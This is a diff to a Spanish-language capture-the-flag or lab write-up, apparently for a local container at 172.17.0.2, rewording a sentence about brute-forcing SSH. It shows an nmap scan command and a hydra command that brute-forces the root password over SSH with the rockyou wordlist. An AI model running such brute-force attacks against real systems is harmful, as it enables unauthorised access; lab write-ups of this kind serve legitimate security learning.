@@ -86,7 +86,7 @@ nmap -sC -sV -p 22 172.17.0.2 -oN target.txt
 
 ## 🗝️ Ataque de Fuerza Bruta con Hydra  
 
-Dado que solo está disponible el puerto SSH (22) y el usuario `root`, intentamos acceder mediante fuerza bruta con `hydra` usando el diccionario `rockyou.txt`:
+Dado que solo está disponible el puerto SSH (22) usare el usuario `root` para verificar si es un usuario disponible, intentamos acceder mediante fuerza bruta con `hydra` usando el diccionario `rockyou.txt`:
 
 ```bash
 sudo hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
